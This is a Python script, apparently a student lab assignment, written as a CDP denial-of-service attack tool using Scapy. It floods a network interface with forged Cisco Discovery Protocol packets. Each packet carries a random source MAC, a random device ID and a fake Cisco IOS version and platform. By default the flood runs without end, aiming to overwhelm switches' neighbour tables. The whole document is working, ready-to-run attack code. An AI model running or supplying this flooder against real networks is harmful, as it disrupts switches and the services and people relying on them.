#!/usr/bin/env python3
"""
==============================================================
  CDP DoS Attack Script
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_CDP_DoS_P1.py
==============================================================
"""

import argparse
import random
import time
import sys
from scapy.all import (
    Ether, SNAP, LLC, sendp, get_if_hwaddr, conf
)
from scapy.contrib.cdp import (
    CDPv2_HDR, CDPMsgDeviceID, CDPMsgPortID,
    CDPMsgCapabilities, CDPMsgSoftwareVersion, CDPMsgPlatform
)

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

def random_device_id(length=12):
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    return "CDP-" + "".join(random.choice(chars) for _ in range(length))

def build_cdp_packet(src_mac, iface):
    device_id = random_device_id()
    port_id   = "GigabitEthernet0/%d" % random.randint(0, 48)
    pkt = (
        Ether(src=src_mac, dst="01:00:0c:cc:cc:cc") /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000C, code=0x2000) /
        CDPv2_HDR(vers=2, ttl=180) /
        CDPMsgDeviceID(val=device_id.encode()) /
        CDPMsgPortID(iface=port_id.encode()) /
        CDPMsgCapabilities() /
        CDPMsgSoftwareVersion(val=b"Cisco IOS Software, Version 15.2") /
        CDPMsgPlatform(val=b"cisco WS-C2960X")
    )
    return pkt

def attack(iface, count, delay):
    print("\n[*] CDP DoS Attack — Ashley Fabian (2025-0773)")
    print(f"[*] Interfaz: {iface} | Paquetes: {'inf' if count==0 else count}\n")
    conf.verb = 0
    sent = 0
    try:
        while count == 0 or sent < count:
            pkt = build_cdp_packet(random_mac(), iface)
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            if sent % 100 == 0:
                print(f"[+] Enviados: {sent}", end="\r")
            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n[!] Detenido. Total enviados: {sent}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-c", "--count", type=int, default=0)
    parser.add_argument("-d", "--delay", type=float, default=0)
    args = parser.parse_args()
    attack(args.iface, args.count, args.delay)

if __name__ == "__main__":
    main()
